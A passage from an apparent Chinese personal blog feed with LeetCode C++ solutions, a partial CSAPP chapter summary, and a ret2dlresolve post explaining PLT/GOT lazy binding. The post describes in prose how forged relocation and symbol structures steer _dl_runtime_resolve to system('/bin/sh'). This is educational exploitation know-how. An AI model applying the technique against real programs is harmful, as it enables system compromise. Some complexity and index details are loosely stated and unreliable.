r)&#123;<br>                <span class="hljs-type">int</span> sum = nums[i] + nums[l] + nums[r];<br>                <span class="hljs-keyword">if</span>(sum == <span class="hljs-number">0</span>)&#123;<br>                    res.<span class="hljs-built_in">push_back</span>(&#123;nums[i],nums[l],nums[r]&#125;);<br>                    <span class="hljs-comment">//l r去重 思索...</span><br>                    <span class="hljs-keyword">while</span>(l &lt; r &amp;&amp; nums[l] == nums[l + <span class="hljs-number">1</span>]) l++;<br>                    <span class="hljs-keyword">while</span>(l &lt; r &amp;&amp; nums[r] == nums[r - <span class="hljs-number">1</span>]) r--;<br>                    l++;<br>                    r--;<br>                &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(sum &lt; <span class="hljs-number">0</span>)&#123;<br>                    l++;<br>                &#125;<span class="hljs-keyword">else</span>&#123;<br>                    r--;<br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> res;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="42-接雨水"><a href="#42-接雨水" class="headerlink" title="42.接雨水"></a>42.接雨水</h2><p><img src="/images/25.png" alt="如图"></p><p>解：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">trap</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; height)</span> </span>&#123;<br>        <span class="hljs-type">int</span> n = height.<span class="hljs-built_in">size</span>();<br>        <span class="hljs-type">int</span> left = <span class="hljs-number">0</span>, right = n - <span class="hljs-number">1</span>;<br>        <span class="hljs-type">int</span> leftmax = <span class="hljs-number">0</span>, rightmax = <span class="hljs-number">0</span>;<br>        <span class="hljs-type">int</span> ans = <span class="hljs-number">0</span>;<br><br>        <span class="hljs-keyword">while</span>(left &lt; right)&#123;<br>            <span class="hljs-keyword">if</span>(height[left] &lt; height[right])&#123;<br>                <span class="hljs-keyword">if</span>(height[left] &gt;= leftmax)&#123;<br>                    leftmax = height[left];<br>                &#125;<span class="hljs-keyword">else</span>&#123;<br>                    ans += leftmax - height[left]; <span class="hljs-comment">//思考...</span><br>                &#125;<br>                left++;<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">if</span>(height[right] &gt;= rightmax)&#123;<br>                    rightmax = height[right];<br>                &#125;<span class="hljs-keyword">else</span>&#123;<br>                    ans += rightmax - height[right]; <span class="hljs-comment">//同理...</span><br>                &#125;<br>                right--;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> ans;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p>思索…</p>]]></content>
    
    
    <categories>
      
      <category>数据结构与算法</category>
      
    </categories>
    
    
    <tags>
      
      <tag>LeetCode</tag>
      
      <tag>算法</tag>
      
      <tag>双指针</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>twoSum</title>
    <link href="/2026/01/17/twoSum/"/>
    <url>/2026/01/17/twoSum/</url>
    
    <content type="html"><![CDATA[<p>起因:coding能力太差导致期末考试被制裁</p><p>因此</p><p>今天从<code>LeetCode</code>的第一题<code>两数之和</code>开始<code>数据结构与算法</code>的学习</p><p>首先给出题目</p><p><img src="/images/14.png" alt="6"></p><p>第一个想法是直接两层for循环暴力枚举所有可能</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">twoSum</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums, <span class="hljs-type">int</span> target)</span> </span>&#123;<br>        <span class="hljs-type">int</span> n =nums.<span class="hljs-built_in">size</span>();<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++)&#123;<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j = i + <span class="hljs-number">1</span>; j &lt; n; j++)&#123;<br>                <span class="hljs-keyword">if</span>(nums[i] + nums[j] == target)&#123;<br>                    <span class="hljs-keyword">return</span> &#123;i, j&#125;;<br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> &#123;&#125;;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p><img src="/images/15.png" alt="6"></p><p>虽然空间复杂度为<code>O(1)</code>，但是这样的话引入了很多无意义比较，比如某个<code>nums[i]</code>可能很小，却和很多不可能匹配的数相加，浪费了许多时间，因此时间复杂度达到了$O(n^2)$，太低效了…</p><p>看看能不能尝试优化一下，减少无意义的搜索</p><p>可以想到先对其进行排序，然后用左右双指针法根据两数之和与<code>target</code>的大小关系移动指针，使其更高效</p><p>代码如下</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">twoSum</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums, <span class="hljs-type">int</span> target)</span> </span>&#123;<br>        vector &lt;pair&lt;<span class="hljs-type">int</span>, <span class="hljs-type">int</span>&gt;&gt; a;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; nums.<span class="hljs-built_in">size</span>(); i++)&#123;<br>            a.<span class="hljs-built_in">push_back</span>(&#123;nums[i],i&#125;);<br>        &#125;<br>        <span class="hljs-built_in">sort</span>(a.<span class="hljs-built_in">begin</span>(),a.<span class="hljs-built_in">end</span>());<br><br>        <span class="hljs-type">int</span> l = <span class="hljs-number">0</span>, r = a.<span class="hljs-built_in">size</span>() - <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">while</span>(l &lt; r)&#123;<br>            <span class="hljs-type">int</span> sum = a[l].first + a[r].first;<br>            <span class="hljs-keyword">if</span>(sum == target)&#123;<br>                <span class="hljs-keyword">return</span> &#123;a[l].second,a[r].second&#125;;<br>            &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(sum &lt; target)&#123;<br>                l++;<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                r--;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> &#123;&#125;;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p><img src="/images/16.png" alt="6"></p><p>此时空间复杂度是<code>O(n)</code></p><p>可以看到确实快了一些，但是还不够，排序的时间复杂度为$O(n \log n)$，能不能不排序，直接实现快速查找？</p><p>这便要引出今天的数据结构:<strong>哈希表</strong></p><p>我们对题目再重新思考一下，题目其实在问，对于每个数<code>x</code>，是否存在一个数<code>y = target - x</code>？</p><p>这本质其实是一个<code>查找</code>问题，而不是<code>枚举</code>问题</p><p>我们可以这样做…</p><p>先遍历数组，对当前<code>nums[i]</code>计算<code>need = target - nums[i]</code>，如果<code>need</code>已经出现过，那么直接返回，否则就把 <code>nums[i]</code>存进<code>哈希表</code></p><p>这样时间复杂度便能达到<code>O(n)</code>，甚至是<code>O(1)</code>！</p><p>代码如下</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unordered_map&gt;</span></span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">twoSum</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums, <span class="hljs-type">int</span> target)</span> </span>&#123;<br>        unordered_map &lt;<span class="hljs-type">int</span>, <span class="hljs-type">int</span>&gt; mp; <span class="hljs-comment">//值，索引</span><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; nums.<span class="hljs-built_in">size</span>(); i++)&#123;<br>            <span class="hljs-type">int</span> need = target - nums[i];<br>            <span class="hljs-keyword">if</span>(mp.<span class="hljs-built_in">count</span>(need))&#123;<br>                <span class="hljs-keyword">return</span> &#123;mp[need],i&#125;;<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                mp[nums[i]] = i;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> &#123;&#125;;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p><img src="/images/17.png" alt="6"></p><p>时间复杂度完美，空间复杂度仍然是<code>O(n)</code>，因为哈希表本质就是空间换时间(不绝对)</p><p>待补充…</p><p>2026.1.19</p><p>仅记录一下做过的题目的代码…</p><p>49.字母异位词分组</p><p><img src="/images/18.png" alt="如图"></p><p>解法:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    vector&lt;vector&lt;string&gt;&gt; <span class="hljs-built_in">groupAnagrams</span>(vector&lt;string&gt;&amp; strs) &#123;<br>        unordered_map&lt;string, vector&lt;string&gt;&gt; mp;<br><br>        <span class="hljs-keyword">for</span>(string s : strs) &#123;<br>            string key =  s;<br>            <span class="hljs-built_in">sort</span>(key.<span class="hljs-built_in">begin</span>(),key.<span class="hljs-built_in">end</span>());<br>            mp[key].<span class="hljs-built_in">push_back</span>(s); <span class="hljs-comment">//值，索引</span><br>        &#125;<br><br>        vector&lt;vector&lt;string&gt;&gt; result;<br><br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">auto</span>&amp; p : mp)&#123;<br>            result.<span class="hljs-built_in">push_back</span>(p.second);<br>        &#125;<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p>128.最长连续序列</p><p><img src="/images/19.png" alt="如图所示"></p><p>解法:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">longestConsecutive</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums)</span> </span>&#123;<br>        <span class="hljs-function">unordered_set&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">st</span><span class="hljs-params">(nums.begin(), nums.end())</span></span>;<br>        <span class="hljs-type">int</span> ans = <span class="hljs-number">0</span>;<br>        <span class="hljs-comment">//思考...</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> x : st) &#123;<br>            <span class="hljs-keyword">if</span> (!st.<span class="hljs-built_in">count</span>(x - <span class="hljs-number">1</span>)) &#123;<br>                <span class="hljs-type">int</span> cur = x;<br>                <span class="hljs-type">int</span> len = <span class="hljs-number">1</span>;<br><br>                <span class="hljs-keyword">while</span> (st.<span class="hljs-built_in">count</span>(cur + <span class="hljs-number">1</span>)) &#123;<br>                    cur++;<br>                    len++;<br>                &#125;<br>                ans = <span class="hljs-built_in">max</span>(ans, len); <span class="hljs-comment">//举一反三</span><br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> ans;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p>注意一下<code>unordered_map</code>和<code>unordered_set</code>的区别</p><p><code>unordered_set</code>只有key(只关心元素存不存在)，<code>unordered_map</code>存在key-&gt;value的<strong>映射</strong>关系</p><p>哈希表的<code>底层</code>原理:</p><p>桶数组(bucket array) + 哈希函数(<strong>映射</strong>关系) + 链表&#x2F;树?(处理<strong>哈希冲突</strong>) + 负载因子扩容(rehash)</p><p>待补充…</p><p>2026.2.11吐槽:</p><p>最近尝试用cpp手搓一个stl</p><p>被cpp的逆天语法击败了</p><p>怎么会有这么抽象的语言???</p><p>后面写到 map set unordered_map unordered_set 再说</p><p>我才知道这些的底层原理原来还不一样qwq</p><p>还好之前写过红黑树，在密码学中也接触过hash~</p><p>拜拜~</p>]]></content>
    
    
    <categories>
      
      <category>数据结构与算法</category>
      
    </categories>
    
    
    <tags>
      
      <tag>LeetCode</tag>
      
      <tag>哈希表</tag>
      
      <tag>性能优化</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>panorama</title>
    <link href="/2026/01/16/panorama/"/>
    <url>/2026/01/16/panorama/</url>
    
    <content type="html"><![CDATA[<p>计算机专业的同学应该都听过一本书，<code>深入理解计算机系统(CSAPP)</code></p><p>其实我很早就开始读了，但是只是囫囵吞枣，根本不知所云，于是便放弃了一段时间。</p><p>现在经历了许多(并非)，对许多名词有了一些概念后，我又重新翻开了这本书，发现许多地方豁然开朗，今天将第一章，<code>计算机系统漫游</code>，也就是标题所说的<code>panorama</code>，总结一下，以遍展开后续的学习。</p><p>以这本书的方式，从你的第一个程序<code>hello</code>的生命周期说起，我们来开始对系统的学习</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Hello,World!\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>hello</code>这个程序，从被你用编辑器创建，到在系统运行，再到输出信息，最后中止，中间发生了什么？</p><p>首先你用某个编辑器创建了文件<code>hello.c</code>，写下代码，并保存，其被称为<strong>源程序</strong>，储存在<code>磁盘</code>中，实际上就是一个由值0和1组成的<strong>位</strong>(又称比特bit)序列，每8个位被称为一个<strong>字节</strong>，每个字节表示程序中的某些文本字符。</p><p>字符如何和字节所代表的数字序列对应呢，通常采用<code>ASCII标准</code>用数字来表示文本字符，二者一一对应</p><p><img src="/images/10.png" alt="如图所示"></p><p>现在，你应该理解了一个基本思想，计算机系统中所有的信息，无论是磁盘文件，内存中的程序，还是网络上传送的数据，都不过是一串<code>比特</code>。区分不同数据对象的唯一方法是我们读到的这些数据的<code>上下文</code>，在不同的上下文中，一个同样的字节序列可能会有不同的含义，这点要注意。</p><p>那么hello.c是怎么变成可执行文件hello的呢？</p><p><img src="/images/11.png" alt="编译系统"></p><p>如图所示，hello.c经过预处理，编译，汇编，链接，最终得到我们的可执行文件hello</p><p>我就直接引用原文了</p><p><img src="/images/12.png" alt="预处理，编译"></p><p><img src="/images/13.png" alt="汇编，链接"></p><p>其中，编译涉及到优化程序的<strong>性能</strong>，链接过程我是通过<code>pwn</code>中<code>ret2dlresolve</code>这种攻击方式才得以理解，涉及链接过程的细节与机制，以及各种安全问题，可以参考我的另一篇博客，虽然我还没写…</p><p>到这里，便得到了可执行文件<code>hello</code>，接下来运行它时发生了什么？</p><p>在终端中可以看到</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">linux&gt; ./hello<br>Hello,World!<br>linux&gt; <br></code></pre></td></tr></table></figure><p>累了，休息，有空再写…</p><p>暂时懒得写</p><p>以后再说!</p><p>加油！</p>]]></content>
    
    
    <categories>
      
      <category>CS</category>
      
    </categories>
    
    
    <tags>
      
      <tag>panorama</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ret2dlresolve</title>
    <link href="/2026/01/15/ret2dlresolve/"/>
    <url>/2026/01/15/ret2dlresolve/</url>
    
    <content type="html"><![CDATA[<p>关于动态链接与延迟绑定</p><p>想起来再写…</p><p>时隔多年终于打算写了，之前认为这个方法比较抽象就没有深入研究，最近打比赛遇到没有gadget的题目时我的傲慢终于付出了代价</p><p>不过一切都不算太迟，现在来看看吧…</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;hello ret2dlresolve!&quot;</span>);<br></code></pre></td></tr></table></figure><p>在c语言中写下这个句子，观察其汇编代码会看到有这么一段</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asm">call printf@plt &lt;printf@plt&gt;<br></code></pre></td></tr></table></figure><p>这个过程到底发生了什么?</p><p>先来了解一下历史吧…</p><p>你应该知道<code>printf</code>是一个库函数，早期，所有库函数在编译期直接拷贝进可执行文件，导致了大量的资源浪费与高额的维护成本</p><p>于是，人们引入了<strong>共享库</strong>的概念，就是我们常看到的<code>libc.so.6</code>，核心思想是多个程序共享同一份代码</p><p>但问题随之而来，程序在编译时根本不知道<code>libc</code>会被加载到哪个地址，函数地址只有在程序运行时才能确定</p><p>最原始的解决方法是这样的，动态链接器(<code>ld-linux-x86-64.so.2</code>)在程序刚启动时，就把用到的所有库函数地址全算一遍，这就是<code>eager binding</code>(立即绑定)，很明显，这样做启动极慢，且大量函数可能一辈子都不会被调用，耗费大量性能</p><p>因此，聪明的工程师们提出了一个非常朴素但革命性的想法，既然很多函数根本不会用到，那为什么要一开始就解析?</p><p>于是便引入了这样的做法，程序启动时，一个函数都不解析，只有当第一次调用某函数时，才去问动态链接器它在哪，这就是<strong>lazy binding</strong>(<code>延迟绑定</code>)!</p><p>为了延迟绑定，<code>ELF</code>文件引入了<code>GOT</code>,<code>PLT</code>,<code>重定位表</code>,<code>dynsym</code>,<code>dynstr</code>等各种乱七八糟的名词，直接看似乎有点抽象，我们去gdb中看看怎么个事儿???</p><p>先从宏观看吧，自顶向下</p><p>回到<code>call printf@plt &lt;printf@plt&gt;</code>，我们si步进一下</p><p>看到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs asm">0x401040 &lt;printf@plt&gt;      endbr64<br>0x401044 &lt;printf@plt+4&gt;    jmp qword ptr [rip + 0x2fb6] &lt;0x401030&gt;<br></code></pre></td></tr></table></figure><p>继续ni步过</p><p>看到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs asm">0x401030   endbr64<br>0x401034   push 0<br>0x401039   jmp 0x401020<br></code></pre></td></tr></table></figure><p>你应该知道，PLT相当于一个跳板，jmp跳转到printf在GOT里存的地址，然而目前是第一次调用printf，GOT中还没有加载其在libc中的真实地址，因此此时该GOT表项被初始化为指向PLT的公共解析入口<code>resolver stub</code>(PLT[0])，也就是你看到的0x401020，它是通向动态链接器的唯一入口，比较重要，而后面从PLT[1]开始，每个PLT表项对应一个外部函数，如PLT[1]对应printf，PLT[3]对应read，同一个函数的PLT表项中，<code>硬编码</code>了它在<code>.rela.plt</code>中的索引，但在真正<strong>延迟绑定</strong>的过程中，真正用于符号解析的还是<code>.rela.plt</code>中的重定位索引，而非PLT表项的编号本身</p><p>也就是这个<code>push 0</code>，这便是关键的<strong>重定位表索引</strong>(relocation index)，动态链接器正是通过该索引，在重定位表中定位到对应的重定位条目，并由该条目进一步确定其所需要解析的符号描述信息(<code>.dynsym</code> <code>.dynstr</code>)，对于其它通过PLT延迟绑定的函数，比如read，假设是<code>push 2</code>好了，其对应的PLT表项中会压入不同的索引值(此时是PLT[3])，该索引在链接阶段已确定，并与<code>.rela.plt</code>中的条目一一对应，而与函数的实际调用顺序无关…</p><p>继续ni，看到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs asm">0x401020   push qword ptr [rip + 0x2fca]   # link_map 指针<br>0x401026   jmp  qword ptr [rip + 0x2fcc] &lt;0x7ffff7fda2f0&gt; # ld-linux-x86-64.so.2: _dl_runtime_resolve<br></code></pre></td></tr></table></figure><p>额讲不下去了</p><p>我自己都觉得有点抽象…</p><p>算了来看看实际的例子吧</p><p>首先是GOT表，分为两部分，<code>.got</code>和<code>.got.plt</code>，<code>.got</code>是全局变量重定位，用于全局变量、静态数据的重定位，程序启动时一次性解析完成，不管</p><p><code>.got.plt</code>才是我们关注的GOT</p><p>结构大致是这样的</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs prolog"><span class="hljs-symbol">GOT</span>[<span class="hljs-number">0</span>]: .dynamic节的地址(动态链接信息) #不管<br><span class="hljs-symbol">GOT</span>[<span class="hljs-number">1</span>]: link_map 结构地址(链接器内部数据结构) #重要<br><span class="hljs-symbol">GOT</span>[<span class="hljs-number">2</span>]: <span class="hljs-symbol">_dl_runtime_resolve</span> 函数地址(动态解析函数) #重要(你猜ret2dlresolve这个名字怎么来的)<br><br><span class="hljs-symbol">GOT</span>[<span class="hljs-number">3</span>]: 第一个动态链接函数(如printf)的地址槽<br><span class="hljs-symbol">GOT</span>[<span class="hljs-number">4</span>]: 第二个动态链接函数(如read)的地址槽<br><span class="hljs-symbol">GOT</span>[<span class="hljs-number">5</span>]: 第三个动态链接函数...<br>...<br></code></pre></td></tr></table></figure><p>在实际的内存布局中大致是这样的(地址随便编的)</p><figure class="highlight ldif"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs ldif">.got.plt 节：<br><span class="hljs-attribute">0x600e00</span>: 0x0000000000400390  <span class="hljs-comment"># GOT[0] - .dynamic地址</span><br><span class="hljs-attribute">0x600e08</span>: 0x00007ffff7ffe170  <span class="hljs-comment"># GOT[1] - link_map</span><br><span class="hljs-attribute">0x600e10</span>: 0x00007ffff7fe9770  <span class="hljs-comment"># GOT[2] - _dl_runtime_resolve</span><br><span class="hljs-attribute">0x600e18</span>: 0x0000000000400596  <span class="hljs-comment"># GOT[3] - printf(初始指向PLT+6)</span><br><span class="hljs-attribute">0x600e20</span>: 0x00007ffff7a7c690  <span class="hljs-comment"># GOT[4] - read(已解析，现存放真实地址)</span><br>...<br></code></pre></td></tr></table></figure><p>PLT表结构是这样的</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs prolog"><span class="hljs-symbol">PLT</span>[<span class="hljs-number">0</span>]: 动态链接器入口(公共桩代码)resolver stub<br><span class="hljs-symbol">PLT</span>[<span class="hljs-number">1</span>]: 第一个动态函数(如printf)的桩代码<br><span class="hljs-symbol">PLT</span>[<span class="hljs-number">2</span>]: 第二个动态函数(如read)的桩代码<br><span class="hljs-symbol">PLT</span>[<span class="hljs-number">3</span>]: 第三个动态函数...<br>...<br></code></pre></td></tr></table></figure><p>具体的代码即是</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-comment"># PLT[0] - 动态链接器入口(所有函数共用)</span><br>push   [GOT + <span class="hljs-number">8</span>]       <span class="hljs-comment">; 压入 link_map</span><br><span class="hljs-keyword">jmp </span>   [GOT + <span class="hljs-number">16</span>]       <span class="hljs-comment">; 跳转到 _dl_runtime_resolve</span><br><br><span class="hljs-comment"># PLT[n] - 第n个函数的桩代码 (n &gt;= 1)</span><br>PLT[n]:<br><span class="hljs-keyword">jmp </span>   [GOT + (n + <span class="hljs-number">2</span>) * <span class="hljs-number">8</span>]  <span class="hljs-comment">; 跳转到 GOT[n + 2]</span><br>push   (n<span class="hljs-number">-1</span>)            <span class="hljs-comment">; 压入重定位索引</span><br><span class="hljs-keyword">jmp </span>   PLT[<span class="hljs-number">0</span>]           <span class="hljs-comment">; 跳转到动态链接器</span><br></code></pre></td></tr></table></figure><p>注意我仅讨论了linux x86-64架构，其它架构核心思想应该都相同…</p><p>这样看是不是把上面的串起来了，第一次调用printf时，<code>call printf@plt &lt;printf@plt&gt;</code>，即调用PLT[1]，开始执行PLT[1]的代码，第一条代码为<code>jmp [GOT + (n + 2) * 8]</code>，而此时GOT[3]还未放入printf的真实地址，其初始化地址其实就是<code>PLT[1] + 6</code>,也就是下一条指令<code>push 0</code>，然后跳转到PLT[0]执行<code>push [GOT + 8]</code>，压入link_map，最后<code>jmp [GOT + 16]</code>，跳转执行<code>_dl_runtime_resolve</code>，此时才是真正解析函数真实地址的地方，我们构造利用的关键</p><p>而当第二次调用printf时，依旧<code>call printf@plt &lt;printf@plt&gt;</code>调用PLT[1]，依旧<code>jmp [GOT + (n + 2) * 8]</code>，而此时printf已经被解析，GOT[3]中已经存入了printf的真实地址，便会直接执行printf，后面的代码便不再会执行了，可以看到，只有在第一次解析时有<code>_dl_runtime_resolve</code>的参与，后面便可以直接在GOT中找到真实地址了，这便是今日讨论的<strong>延迟绑定</strong>的精髓所在</p><p>这种设计哲学，既避免了程序启动阶段不必要的解析性能开销，同时又保证了后续调用的执行效率，真是无比智慧啊~</p><p>然而…</p><p>为了支持这种按需解析机制，ELF在程序中保留了完整的重定位信息与符号描述结构，并允许动态链接器在运行时根据这些信息修改GOT内容，这一设计在提升<code>灵活性</code>的同时，也为我们的<strong>攻击面</strong>埋下了伏笔…</p><p>通过伪造<code>link_map</code>以及<strong>重定位索引</strong>，我们可以在程序可控的内存区域中构造出符合ELF规范的<code>Elf64_Rela</code>,符号表(<code>.dynsym</code>)以及字符串表(<code>.dynstr</code>)等关键结构体，使程序在执行<code>_dl_runtime_resolve</code>时误以为这些数据来源于合法的ELF映像，从而按照既定的动态链接流程解析并跳转到我们指定的函数地址…</p><p>程序以为它在正常地解析一个printf函数，殊不知，整个解析过程都被我们控制，直接解析成了<code>system(/bin/sh)</code>，哈哈哈哈哈</p><p>哪个才是真正的我，我自己也不知道…</p><p class="note note-primary">Full Relro : 你在说什么?</p><p>全剧终…</p><p>to be 